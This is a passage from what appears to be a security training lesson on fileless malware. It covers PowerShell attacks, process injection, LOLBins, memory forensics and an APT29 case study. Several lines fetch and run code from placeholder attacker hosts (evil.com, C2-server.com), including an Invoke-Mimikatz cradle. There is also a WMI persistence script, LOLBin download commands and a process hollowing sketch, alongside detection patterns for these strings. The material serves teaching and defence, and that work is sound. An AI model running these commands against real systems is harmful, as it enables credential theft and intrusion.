{
  "lesson_id": "9a8b7c6d-5e4f-3d2c-1b0a-9f8e7d6c5b4a",
  "domain": "malware",
  "title": "Fileless Malware and Memory-Only Attacks",
  "difficulty": 3,
  "order_index": 7,
  "prerequisites": [
    "7e9f1a2b-3c4d-5e6f-7a8b-9c0d1e2f3a4b"
  ],
  "concepts": [
    "Fileless Malware Architecture",
    "PowerShell-Based Attacks",
    "Memory Injection Techniques",
    "Process Hollowing and DLL Injection",
    "Reflective PE Loading",
    "WMI and CIM for Persistence",
    "Living Off the Land Binaries (LOLBins)",
    "Memory Forensics and Detection",
    "Behavioral Analysis for Fileless Threats",
    "Defensive Strategies Against Fileless Malware"
  ],
  "estimated_time": 60,
  "learning_objectives": [
    "Understand why fileless malware evades traditional antivirus and file-based detection",
    "Analyze PowerShell-based attacks including Invoke-Mimikatz and Empire framework",
    "Identify memory injection techniques: process hollowing, DLL injection, reflective loading",
    "Use memory forensics tools to detect fileless malware in RAM",
    "Implement behavioral detection and EDR strategies for fileless threats",
    "Apply defensive countermeasures including PowerShell logging and AMSI"
  ],
  "post_assessment": [
    {
      "question": "You detect suspicious PowerShell execution: powershell.exe -NoP -sta -NonI -W Hidden -Enc <base64>. Why is this concerning, and what analysis steps would you take?",
      "correct_answer": "Red flags: -NoP (no profile, evades logging), -NonI (non-interactive, hidden), -W Hidden (no window), -Enc (encoded, hides malicious content). Steps: 1) Decode base64, 2) Check process parent, 3) Analyze decoded script, 4) Check network connections, 5) Memory dump analysis.",
      "explanation": "Each parameter is designed to evade detection: -NoProfile skips PowerShell profile (which might log activity), -NonInteractive prevents user interaction, -WindowStyle Hidden makes it invisible, -EncodedCommand hides malicious script from casual inspection. Analysis: Decode with [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('base64')), Identify parent process (Excel, Word = macro-based delivery), Analyze decoded command for C2 URLs, credential theft (Mimikatz), or lateral movement, Capture network traffic (may download additional payloads), Memory forensics with Volatility or Process Hacker (in-memory payloads won't be on disk).",
      "common_mistakes": [
        "Assuming encoded PowerShell is always malicious (some legitimate tools use it)",
        "Not checking what spawned PowerShell (parent process analysis)",
        "Only decoding first layer (malware may use multiple encoding layers)",
        "Not capturing memory (fileless malware leaves no disk artifacts)"
      ],
      "related_concepts": [
        "PowerShell-Based Attacks",
        "Living Off the Land Binaries (LOLBins)"
      ],
      "difficulty": 3,
      "real_world_application": "Emotet, TrickBot, and Dridex use exactly this PowerShell technique. APT29 (Cozy Bear) extensively uses encoded PowerShell for initial access. Modern EDR platforms specifically monitor PowerShell with these flags. Understanding this technique is critical for SOC analysts - you'll see this in real attacks daily.",
      "question_id": "094c859a-abe0-4cc8-a9a5-21d63fc71295",
      "type": "multiple_choice"
    },
    {
      "question": "Process Explorer shows powershell.exe with unusual memory behavior: private bytes 500MB, handles to lsass.exe, network connections to unknown IPs. What fileless attack is likely occurring?",
      "correct_answer": "Likely Mimikatz in memory (credential dumping from LSASS) combined with C2 communication. Powershell loaded Invoke-Mimikatz via Invoke-Expression (downloaded from internet), dumped credentials, and is exfiltrating to C2. Memory-only attack, no files on disk.",
      "explanation": "Analysis of indicators: 500MB private bytes in PowerShell (abnormal - typical is < 50MB, indicates large payload loaded in memory), Handles to lsass.exe (credential dumping via Mimikatz requires LSASS access), Network connections (exfiltrating stolen credentials). Attack chain: PowerShell downloads Invoke-Mimikatz.ps1 via IEX (New-Object Net.WebClient).DownloadString(), Mimikatz loads entirely in PowerShell process memory (reflective PE loading), Mimikatz dumps credentials from LSASS memory, Credentials exfiltrated via HTTPS to C2. No files written to disk = evades file-based AV.",
      "common_mistakes": [
        "Terminating PowerShell without memory capture (loses all evidence)",
        "Not checking PowerShell command-line history",
        "Missing that same technique may be running in other processes",
        "Not correlating with authentication logs (are stolen credentials being used?)"
      ],
      "related_concepts": [
        "Memory Injection Techniques",
        "Reflective PE Loading"
      ],
      "difficulty": 3,
      "real_world_application": "Invoke-Mimikatz is used in 70%+ of post-exploitation attacks. APT groups (APT28, APT29, Lazarus) all use memory-only credential dumping. NotPetya and Bad Rabbit ransomware used this technique for lateral movement. Organizations must monitor PowerShell behavior, not just file creation, to detect these attacks.",
      "question_id": "e042161f-970e-4411-b95e-26051b56b68c",
      "type": "multiple_choice"
    },
    {
      "question": "How does process hollowing evade antivirus, and what memory forensics artifacts would reveal it?",
      "correct_answer": "Process hollowing: creates legitimate process (svchost.exe) suspended, replaces memory with malicious code, resumes. Evades AV because parent process is legitimate. Forensics artifacts: memory sections with RWX permissions, unexpected code in process memory, VAD (Virtual Address Descriptor) analysis shows unmapped sections.",
      "explanation": "Process Hollowing Steps: 1) CreateProcess with CREATE_SUSPENDED flag (legitimate svchost.exe), 2) NtUnmapViewOfSection (removes legitimate code from memory), 3) VirtualAllocEx (allocate memory for malicious code), 4) WriteProcessMemory (write malicious PE into allocated memory), 5) SetThreadContext (set entry point to malicious code), 6) ResumeThread (start execution). Why AV fails: Process appears as legitimate svchost.exe, No malicious file on disk, Process tree looks normal. Forensics detection: Volatility plugin malfind (finds RWX memory sections), Hollowfind plugin (detects PEB manipulation), Check if process memory matches disk file (Process Hacker - Memory tab, strings will be different), VAD tree analysis (unmapped/private sections). Tools: Volatility, Process Hacker, HollowsHunter.",
      "common_mistakes": [
        "Trusting process name alone (svchost.exe may be malicious)",
        "Not checking memory permissions (RWX is huge red flag)",
        "Not comparing process memory to disk file",
        "Missing child processes spawned by hollowed process"
      ],
      "related_concepts": [
        "Process Hollowing and DLL Injection",
        "Memory Forensics and Detection"
      ],
      "difficulty": 3,
      "real_world_application": "Process hollowing used by Zeus, Emotet, TrickBot, Dridex, and nation-state malware. Carbanak APT group uses it extensively. Modern ransomware (Maze, REvil) uses hollowing to hide in legitimate Windows processes. EDR tools now detect process hollowing via memory heuristics, but basic AV still misses it.",
      "question_id": "543735ee-4fa8-4a64-bbfa-6f6dac6a65ff",
      "type": "multiple_choice"
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "connect_to_what_i_know",
    "minimum_effective_dose",
    "teach_like_im_10",
    "memory_hooks",
    "meta_learning",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "type": "explanation",
      "content": {
        "title": "Fileless Malware: The Evolution of Evasion",
        "text": "Fileless malware represents a fundamental shift in how attacks work. Traditional malware writes files to disk - executables, DLLs, scripts. File-based antivirus scans these files and detects signatures. Fileless malware bypasses this entirely by operating in memory only.\n\nWhat Is Fileless Malware?\n\nDefinition: Malware that executes without writing persistent malicious files to disk. Instead, it abuses legitimate system tools and operates entirely in memory.\n\nKey Characteristics:\n- No malicious .exe or .dll files written to disk\n- Executes in memory of legitimate processes\n- Abuses built-in Windows tools (PowerShell, WMI, WMIC)\n- Leverages legitimate system binaries (LOLBins)\n- Often uses script-based execution (PowerShell, VBScript, JavaScript)\n\nWhy Fileless Malware Is Effective:\n\n1. Evades Signature-Based Detection:\n   - Traditional AV scans files for malware signatures\n   - No file on disk = nothing to scan\n   - Statistics: 77% increase in fileless attacks 2017-2020 (Ponemon Institute)\n\n2. Bypasses Application Whitelisting:\n   - PowerShell, WMIC, WMI are legitimate Windows tools\n   - Application whitelisting allows them\n   - Malware abuses these trusted tools\n\n3. Difficult to Forensically Analyze:\n   - Memory is volatile (lost on reboot)\n   - No persistent artifacts (no files to analyze)\n   - Requires memory forensics expertise\n\n4. Leaves Minimal Footprint:\n   - Process looks legitimate (powershell.exe, svchost.exe)\n   - Blends into normal system activity\n   - Requires behavioral analysis to detect\n\nThe Fileless Attack Kill Chain:\n\n1. Initial Compromise:\n   - Phishing email with malicious macro\n   - Drive-by download from compromised website\n   - Exploit in browser or plugin\n\n2. Stage 1 - Downloader:\n   - Minimal dropper (may touch disk briefly)\n   - PowerShell/VBScript downloads payload\n   - Payload loaded directly into memory\n\n3. Stage 2 - In-Memory Execution:\n   - Payload injected into legitimate process\n   - Process hollowing (replace legitimate process memory)\n   - Reflective DLL injection (load DLL without file)\n\n4. Stage 3 - Persistence:\n   - WMI event subscriptions (no files)\n   - Registry keys pointing to scripts in memory\n   - Scheduled tasks executing PowerShell from URL\n\n5. Stage 4 - Post-Exploitation:\n   - Credential dumping (Mimikatz in memory)\n   - Lateral movement (PowerShell remoting)\n   - Data exfiltration (BITS jobs, DNS tunneling)\n\nKey Techniques in Detail:\n\n1. PowerShell-Based Attacks:\n\nPowerShell is a legitimate system administration tool, but attackers abuse it because:\n- Pre-installed on all modern Windows systems\n- Full access to .NET Framework and Windows APIs\n- Can download and execute code from internet (Invoke-Expression)\n- Can run entirely in memory (no file written)\n\nCommon PowerShell attack patterns:\n\nPattern 1 - Download and Execute:\n```powershell\nIEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')\n```\nDownloads PowerShell script from internet, executes in memory.\n\nPattern 2 - Encoded Command:\n```powershell\npowershell.exe -EncodedCommand <base64_encoded_payload>\n```\nHides malicious code in base64 encoding.\n\nPattern 3 - Invoke-Mimikatz:\n```powershell\nIEX (New-Object Net.WebClient).DownloadString('http://evil.com/Invoke-Mimikatz.ps1')\nInvoke-Mimikatz -DumpCreds\n```\nLoads Mimikatz entirely in PowerShell process memory, dumps credentials.\n\nPattern 4 - Empire/Metasploit Stagers:\n```powershell\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}\n$wc=New-Object System.Net.WebClient\n$wc.Proxy=[System.Net.WebRequest]::GetSystemWebProxy()\n$wc.Proxy.Credentials=[System.Net.CredentialCache]::DefaultCredentials\nIEX $wc.DownloadString('https://C2-server.com/stage2.ps1')\n```\nMulti-stage loader, bypasses SSL validation, uses proxy authentication.\n\n2. Memory Injection Techniques:\n\nOnce malware gains initial execution, it injects into legitimate processes:\n\nTechnique A - DLL Injection:\n1. Find target process (explorer.exe)\n2. VirtualAllocEx - allocate memory in target\n3. WriteProcessMemory - write malicious DLL path\n4. CreateRemoteThread - execute LoadLibrary to load DLL\n\nResult: Malicious DLL runs inside explorer.exe. Process tree looks clean.\n\nTechnique B - Process Hollowing:\n1. Create legitimate process suspended (svchost.exe)\n2. Unmap original executable from memory\n3. Write malicious executable into hollowed process\n4. Resume execution\n\nResult: Task Manager shows svchost.exe, but memory contains malware.\n\nTechnique C - Reflective DLL Injection:\n1. Read malicious DLL into memory\n2. Manually resolve imports and relocations\n3. Call DllMain without using LoadLibrary\n\nResult: DLL executes without ever touching disk or appearing in module list.\n\nTechnique D - Process Doppelganging:\n1. Create transacted file (TxF)\n2. Write malicious executable to transaction\n3. Create process from transacted file\n4. Rollback transaction (file disappears)\n\nResult: Process runs from file that no longer exists on disk.\n\n3. Living Off the Land Binaries (LOLBins):\n\nLOLBins are legitimate Windows binaries that can be abused for malicious purposes:\n\nExamples:\n- PowerShell.exe - download/execute malicious code\n- WMIC.exe - execute commands, establish persistence\n- Rundll32.exe - load malicious DLLs\n- Regsvr32.exe - download and execute scriptlets\n- Mshta.exe - execute malicious HTA files\n- Certutil.exe - download files, decode base64\n- Bitsadmin.exe - download malware\n\nWhy LOLBins are dangerous:\n- Pre-installed and trusted by OS\n- Bypasses application whitelisting\n- Looks like legitimate admin activity\n- Difficult to block without breaking legitimate use\n\nThe Detection Challenge:\n\nTraditional security tools fail against fileless malware:\n\n- Antivirus: Scans files (no files to scan)\n- File integrity monitoring: No files changed\n- Application whitelisting: Abuses allowed applications\n- Network signatures: Often uses HTTPS (encrypted)\n\nRequired: Behavioral analysis, memory forensics, EDR solutions.\n\nReal-World Impact:\n\nFileless malware is not theoretical:\n\n- Emotet: PowerShell downloaders, process injection\n- TrickBot: Memory-resident modules, process hollowing\n- APT29 (Cozy Bear): PowerShell Empire, WMI persistence\n- APT32 (OceanLotus): Reflective DLL injection\n- FIN7: Fileless JavaScript, PowerShell stages\n- NotPetya: Mimikatz in memory for credential theft\n\nStatistics:\n- 40% of attacks in 2023 were fileless (CrowdStrike)\n- Fileless attacks 10x more likely to succeed (Ponemon)\n- 77% harder to detect than file-based malware\n\nWhy Now?\n\nFileless malware rise correlates with:\n1. Improved endpoint security (file-based defenses stronger)\n2. Red team tools going public (Mimikatz, Empire, Cobalt Strike)\n3. PowerShell ubiquity (every Windows box has it)\n4. Living-off-the-land techniques documented (LOLBAS project)\n\nAttackers adapted. Defenders must too.\n\nThe Bottom Line:\n\nFileless malware is the present and future of cyber attacks. Understanding memory-based techniques, PowerShell abuse, and process injection is no longer optional - it's fundamental to security operations.\n\nNext sections will cover detection, analysis, and defense strategies."
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "title": "Detecting and Analyzing Fileless Malware",
        "text": "Let's hunt for fileless malware using memory forensics, PowerShell logging, and behavioral analysis.\n\nScenario: You suspect a system is compromised but AV finds nothing. Let's investigate.\n\nStep 1: PowerShell Logging and Analysis\n\nEnable comprehensive PowerShell logging:\n\n```powershell\n# Enable PowerShell Script Block Logging (logs all executed scripts)\nNew-Item -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\" -Force\nSet-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\" -Name \"EnableScriptBlockLogging\" -Value 1\n\n# Enable PowerShell Transcription (logs all PowerShell activity)\nNew-Item -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription\" -Force\nSet-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription\" -Name \"EnableTranscripting\" -Value 1\nSet-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription\" -Name \"OutputDirectory\" -Value \"C:\\PSTranscripts\"\n\n# Enable Module Logging (logs all PowerShell modules loaded)\nNew-Item -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging\" -Force\nSet-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging\" -Name \"EnableModuleLogging\" -Value 1\n```\n\nAnalyze PowerShell logs for suspicious activity:\n\n```powershell\n# Check PowerShell event logs for suspicious commands\nGet-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} |\n  Where-Object {$_.Message -match 'DownloadString|IEX|Invoke-Expression|EncodedCommand|FromBase64String|Mimikatz|Invoke-Shellcode'} |\n  Select-Object TimeCreated, Message | Format-List\n\n# Event ID 4104 = Script Block Logging (shows actual script content)\n\n# Decode base64 PowerShell commands\nGet-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} |\n  Where-Object {$_.Message -match 'FromBase64String'} | ForEach-Object {\n    if ($_.Message -match 'FromBase64String\\(''([A-Za-z0-9+/=]+)'')') {\n        $encoded = $matches[1]\n        try {\n            $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))\n            [PSCustomObject]@{\n                Time = $_.TimeCreated\n                Decoded = $decoded\n            }\n        } catch {}\n    }\n  }\n```\n\nStep 2: Detect In-Memory PowerShell Payloads\n\n```powershell\n# Find PowerShell processes with unusual memory usage\nGet-Process -Name powershell* | Where-Object {$_.WorkingSet64 -gt 100MB} | \n  Select-Object Id, ProcessName, @{Name='MemoryMB';Expression={[math]::Round($_.WorkingSet64/1MB,2)}}, StartTime, Path\n\n# Dump PowerShell command history (shows what user/malware typed)\nGet-Content (Get-PSReadlineOption).HistorySavePath\n\n# Check for suspicious PowerShell modules loaded\nGet-Process -Name powershell* | ForEach-Object {\n    $proc = $_\n    Get-Process -Id $proc.Id -Module -ErrorAction SilentlyContinue | \n      Where-Object {$_.ModuleName -notlike \"*system32*\" -and $_.ModuleName -notlike \"*syswow64*\"} |\n      Select-Object @{Name='ProcessID';Expression={$proc.Id}}, ModuleName, FileName\n}\n\n# Check network connections from PowerShell\nGet-NetTCPConnection | Where-Object {$_.OwningProcess -in (Get-Process -Name powershell*).Id} |\n  Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, @{Name='Process';Expression={(Get-Process -Id $_.OwningProcess).Name}}\n```\n\nStep 3: Memory Analysis with Volatility\n\nCapture memory dump:\n```bash\n# On Windows: Use DumpIt, FTK Imager, or WinPMEM\n# Example with DumpIt\nDumpIt.exe\n\n# Outputs: memory.dmp\n```\n\nAnalyze with Volatility:\n```bash\n# Identify memory profile\nvol.py -f memory.dmp imageinfo\n\n# List processes\nvol.py -f memory.dmp --profile=Win10x64_19041 pslist\n\n# Find hidden/injected processes\nvol.py -f memory.dmp --profile=Win10x64_19041 psscan\n\n# Compare: processes in pslist vs psscan\n# Missing from pslist = hidden by rootkit\n\n# Detect process hollowing\nvol.py -f memory.dmp --profile=Win10x64_19041 hollowfind\n\n# Find injected code (executable memory not backed by file)\nvol.py -f memory.dmp --profile=Win10x64_19041 malfind\n\n# Output shows:\n# - Process with injected code\n# - Memory address\n# - Protection (RWX = huge red flag)\n# - Disassembly of injected code\n\n# Extract suspicious process memory\nvol.py -f memory.dmp --profile=Win10x64_19041 memdump -p <PID> --dump-dir=./output/\n\n# Scan extracted memory with YARA rules\nyara -r mimikatz_rules.yar ./output/\n```\n\nStep 4: Detect Reflective DLL Injection\n\n```powershell\n# Use Process Hacker to detect unmapped DLLs\n# Steps:\n# 1. Open Process Hacker\n# 2. Find suspicious process (powershell.exe with high memory)\n# 3. Properties → Memory\n# 4. Look for memory regions:\n#    - Type: Private (not Image/Mapped)\n#    - Protection: Execute/Read/Write (RWX)\n#    - Size: > 100KB (indicates DLL/executable)\n\n# Programmatic detection\nGet-Process | ForEach-Object {\n    $proc = $_\n    try {\n        $handle = [Kernel32]::OpenProcess(0x1F0FFF, $false, $proc.Id)\n        if ($handle -ne [IntPtr]::Zero) {\n            # Check for suspicious memory regions\n            # (Requires P/Invoke to VirtualQueryEx - complex)\n            # Use pe-sieve or HollowsHunter tools instead\n        }\n    } catch {}\n}\n\n# Use pe-sieve (detects hollowing, reflective injection)\n# Download from: https://github.com/hasherezade/pe-sieve\npe-sieve.exe /pid <suspicious_PID> /data 3 /json\n\n# Output shows:\n# - Implanted PEs (reflective DLLs)\n# - Hooked modules\n# - Replaced processes (hollowing)\n```\n\nStep 5: WMI Event Subscription Hunting\n\n```powershell\n# Check for malicious WMI event subscriptions\nWrite-Host \"[*] Hunting for WMI persistence...\" -ForegroundColor Cyan\n\n# Event Filters (defines what triggers the event)\nGet-WMIObject -Namespace root\\subscription -Class __EventFilter | \n  Select-Object Name, Query, EventNamespace\n\n# Event Consumers (defines what happens)\nGet-WMIObject -Namespace root\\subscription -Class __EventConsumer | \n  Select-Object Name, @{Name='Type';Expression={$_.__CLASS}}, CommandLineTemplate, ScriptText\n\n# Bindings (links filter to consumer)\nGet-WMIObject -Namespace root\\subscription -Class __FilterToConsumerBinding | \n  ForEach-Object {\n    [PSCustomObject]@{\n        Filter = $_.Filter.Name\n        Consumer = $_.Consumer.Name\n    }\n  }\n\n# Decode obfuscated WMI scripts\n$consumers = Get-WMIObject -Namespace root\\subscription -Class ActiveScriptEventConsumer\nforeach ($consumer in $consumers) {\n    Write-Host \"`n[!] Found ActiveScriptEventConsumer: $($consumer.Name)\" -ForegroundColor Red\n    if ($consumer.ScriptText -match 'FromBase64String') {\n        # Extract and decode base64\n        Write-Host \"[!] Contains encoded payload\" -ForegroundColor Red\n    }\n}\n```\n\nStep 6: AMSI (Antimalware Scan Interface) Analysis\n\nAMSI intercepts script execution and sends to AV:\n\n```powershell\n# Check AMSI events in Windows Defender log\nGet-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Windows Defender/Operational'; ID=1116,1117} |\n  Where-Object {$_.Message -match 'AMSI'} |\n  Select-Object TimeCreated, Message | Format-List\n\n# Event ID 1116 = Malware detected\n# Event ID 1117 = Action taken\n\n# Note: Attackers often try to bypass AMSI\n# Look for AMSI bypass attempts:\nGet-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} |\n  Where-Object {$_.Message -match 'AmsiScanBuffer|AmsiUtils|amsiInitFailed'} |\n  Select-Object TimeCreated, Message\n```\n\nStep 7: Sysmon Integration\n\nSysmon provides detailed telemetry:\n\n```powershell\n# Check Sysmon for process injection\nGet-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=8} |\n  ForEach-Object {\n    $xml = [xml]$_.ToXml()\n    [PSCustomObject]@{\n        Time = $_.TimeCreated\n        SourceProcess = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'SourceImage'} | Select-Object -ExpandProperty '#text'\n        TargetProcess = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TargetImage'} | Select-Object -ExpandProperty '#text'\n    }\n  } | Where-Object {$_.SourceProcess -match 'powershell|rundll32|regsvr32'}\n\n# Event ID 8 = CreateRemoteThread (process injection)\n\n# Check for process hollowing indicators\nGet-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1} |\n  ForEach-Object {\n    $xml = [xml]$_.ToXml()\n    $cmdline = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'CommandLine'} | Select-Object -ExpandProperty '#text'\n    if ($cmdline -match 'CREATE_SUSPENDED') {\n        [PSCustomObject]@{\n            Time = $_.TimeCreated\n            Image = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'Image'} | Select-Object -ExpandProperty '#text'\n            CommandLine = $cmdline\n        }\n    }\n  }\n\n# CREATE_SUSPENDED flag often used in process hollowing\n```\n\nStep 8: Network Traffic Analysis\n\nFileless malware still needs network for C2:\n\n```powershell\n# Capture network traffic from PowerShell processes\n$pids = (Get-Process -Name powershell*).Id\nnetstat -ano | Select-String ($pids -join '|')\n\n# Or use TCP connection details\nGet-NetTCPConnection | Where-Object {$_.OwningProcess -in $pids -and $_.RemoteAddress -ne '127.0.0.1'} |\n  ForEach-Object {\n    $conn = $_\n    try {\n        $dns = [System.Net.Dns]::GetHostByAddress($conn.RemoteAddress)\n        [PSCustomObject]@{\n            LocalPort = $conn.LocalPort\n            RemoteAddress = $conn.RemoteAddress\n            RemotePort = $conn.RemotePort\n            RemoteHost = $dns.HostName\n            State = $conn.State\n        }\n    } catch {\n        [PSCustomObject]@{\n            LocalPort = $conn.LocalPort\n            RemoteAddress = $conn.RemoteAddress\n            RemotePort = $conn.RemotePort\n            RemoteHost = \"(No DNS)\"\n            State = $conn.State\n        }\n    }\n  }\n\n# Check reputation of remote IPs\n# Use VirusTotal, AbuseIPDB, etc.\n```\n\nComplete Investigation Workflow:\n\n1. PowerShell logging → Identify suspicious commands\n2. Process memory analysis → High memory usage in PowerShell\n3. Memory dump with Volatility → malfind shows injected code\n4. pe-sieve → Confirms reflective DLL injection\n5. Network analysis → Identifies C2 domain\n6. Sysmon logs → Traces attack chain from initial infection\n7. WMI hunting → Finds persistence mechanism\n\nThis multi-layered approach is required because fileless malware leaves no single definitive artifact."
      }
    },
    {
      "type": "real_world",
      "content": {
        "title": "APT29 (Cozy Bear): Fileless Tradecraft Analysis",
        "text": "APT29, also known as Cozy Bear or The Dukes, is a Russian nation-state threat actor attributed to the Russian Foreign Intelligence Service (SVR). APT29 is one of the most sophisticated fileless malware operators. Let's analyze their techniques.\n\nAPT29 Campaign: SolarWinds Supply Chain Attack (2020)\n\nBackground:\n- Compromised SolarWinds Orion software updates\n- 18,000+ organizations received trojanized update\n- APT29 selectively targeted ~100 high-value organizations\n- US Government agencies, Fortune 500 companies\n- Discovery: December 2020 by FireEye\n\nFileless Techniques Used by APT29:\n\n1. In-Memory BEACON Implant:\n\nAPT29's SUNBURST backdoor injected Cobalt Strike BEACON into memory:\n\n```\nPhase 1: SUNBURST (SolarWinds backdoor)\n  ↓\nPhase 2: TEARDROP (memory-only dropper)\n  ↓\nPhase 3: Cobalt Strike BEACON (reflective DLL)\n  ↓\nPhase 4: Lateral movement (WMI, PowerShell remoting)\n```\n\nTEARDROP loader:\n- Custom in-memory dropper\n- Reads payload from registry or file\n- Decrypts XOR-encrypted payload\n- Injects into memory using Windows API (CreateProcess, WriteProcessMemory, CreateThread)\n- No file written to disk\n\nCobalt Strike BEACON:\n- Loaded via reflective DLL injection\n- Never touches disk\n- Executes entirely in memory of legitimate process\n- Uses named pipes for process-to-process communication\n- Obfuscates network traffic (HTTPS to legitimate-looking domains)\n\n2. PowerShell and WMI Abuse:\n\nAPT29 extensively uses PowerShell for post-exploitation:\n\nExample - Credential Dumping:\n```powershell\n# APT29 custom Mimikatz variant loaded in memory\n$url = \"https://compromised-site.com/module.ps1\"\nIEX (New-Object Net.WebClient).DownloadString($url)\nInvoke-CustomMimikatz -Command \"sekurlsa::logonpasswords\"\n```\n\nExecutes entirely in PowerShell.exe process:\n- Downloads encrypted payload\n- Decrypts in memory\n- Invokes custom Mimikatz variant\n- Dumps credentials\n- Exfiltrates via HTTPS\n- No files written\n\nWMI Persistence:\n```powershell\n# APT29 WMI event subscription\n$FilterArgs = @{\n    Name = 'SystemMaintenanceFilter'\n    EventNamespace = 'root\\cimv2'\n    Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"\n}\n$Filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments $FilterArgs\n\n$ConsumerArgs = @{\n    Name = 'SystemMaintenanceConsumer'\n    CommandLineTemplate = 'powershell.exe -NoP -W Hidden -Enc <base64_payload>'\n}\n$Consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs\n\n$BindingArgs = @{\n    Filter = $Filter\n    Consumer = $Consumer\n}\nSet-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments $BindingArgs\n```\n\nThis persistence:\n- Triggers every 60 seconds\n- Executes PowerShell command\n- Stored only in WMI repository (no files)\n- Survives reboot\n- Rarely monitored\n\n3. Living Off the Land:\n\nAPT29 uses legitimate Windows tools extensively:\n\n```bash\n# Lateral movement with WMI\nwmic /node:TARGET-PC process call create \"powershell.exe -Enc <payload>\"\n\n# File transfer with CertUtil\ncertutil -urlcache -split -f http://C2-server.com/payload.exe payload.exe\n\n# Background download with BITS\nbitsadmin /transfer job /download /priority high http://C2.com/payload.txt C:\\temp\\payload.txt\n\n# Execute via Rundll32\nrundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://C2.com/payload.sct\")\n```\n\nAll commands use legitimate Windows binaries. Application whitelisting useless.\n\n4. Process Injection:\n\nAPT29's SUNSPOT malware (persistence in build environment) used process hollowing:\n\n```cpp\n// Simplified SUNSPOT process injection\nHANDLE hProcess = CreateProcess(\n    \"C:\\\\Windows\\\\System32\\\\svchost.exe\",\n    NULL, NULL, NULL, FALSE,\n    CREATE_SUSPENDED,  // Suspended state\n    NULL, NULL, &si, &pi\n);\n\n// Unmap original svchost memory\nNtUnmapViewOfSection(hProcess, pImageBase);\n\n// Allocate memory for malicious code\nVirtualAllocEx(hProcess, pImageBase, dwImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\n// Write malicious PE\nWriteProcessMemory(hProcess, pImageBase, pMaliciousImage, dwImageSize, NULL);\n\n// Set entry point\nSetThreadContext(pi.hThread, &ctx);\n\n// Resume execution\nResumeThread(pi.hThread);\n```\n\nResult:\n- Task Manager shows legitimate svchost.exe\n- Memory contains SUNSPOT malware\n- Process tree looks normal\n- No malicious files on disk\n\n5. Network Obfuscation:\n\nAPT29 C2 traffic designed to blend in:\n\n- HTTPS to legitimate-looking domains\n- User-Agent strings mimicking common browsers\n- Beaconing intervals with jitter (randomized timing)\n- Domain fronting (C2 hidden behind CDN)\n- DNS tunneling for slow exfiltration\n\nExample C2 domain:\n- avsvmcloud.com (looks like AV cloud service)\n- freescanonline.com (looks like security scanner)\n\nNetwork signatures ineffective. Requires behavioral analysis.\n\nDetection Challenges:\n\nWhy APT29 went undetected for 9+ months:\n\n1. No Malicious Files:\n   - Signature-based AV useless\n   - File integrity monitoring finds nothing\n   - Forensic analysis finds no artifacts\n\n2. Legitimate Tools:\n   - PowerShell, WMI, Rundll32 all allowed\n   - Application whitelisting bypassed\n   - Appears as normal admin activity\n\n3. Encrypted C2:\n   - HTTPS traffic looks normal\n   - No network signatures\n   - Blends with legitimate traffic\n\n4. Memory-Only Payloads:\n   - Lost on reboot (unless persistence active)\n   - Requires memory forensics\n   - Most organizations don't do memory analysis\n\n5. Slow and Stealthy:\n   - Low beaconing frequency (hours between connections)\n   - Small data exfiltration (kilobytes, not gigabytes)\n   - Selective targeting (only activates for high-value targets)\n\nHow APT29 Was Finally Detected:\n\nFireEye (victim themselves) detected APT29 through:\n\n1. Behavioral Anomalies:\n   - PowerShell execution from unexpected service accounts\n   - WMI lateral movement at unusual times\n   - Access to Azure AD (unusual for on-prem service)\n\n2. Memory Forensics:\n   - Memory dump of suspected system\n   - Volatility analysis found injected Cobalt Strike BEACON\n   - Strings analysis revealed C2 domains\n\n3. Network Traffic Analysis:\n   - Long-term NetFlow analysis\n   - Identified beaconing pattern (regular intervals to same IP)\n   - Pivot to identify other infected systems\n\n4. Threat Intelligence:\n   - Correlated with known APT29 TTPs\n   - Matched Cobalt Strike configuration to previous campaigns\n   - Attribution through infrastructure reuse\n\nDefense Recommendations Against APT29-Style Attacks:\n\n1. PowerShell Defenses:\n   - Enable Script Block Logging (Event ID 4104)\n   - Enable Transcription\n   - Constrained Language Mode for non-admins\n   - AMSI (Antimalware Scan Interface)\n   - Monitor: DownloadString, IEX, EncodedCommand\n\n2. WMI Monitoring:\n   - Baseline normal WMI event 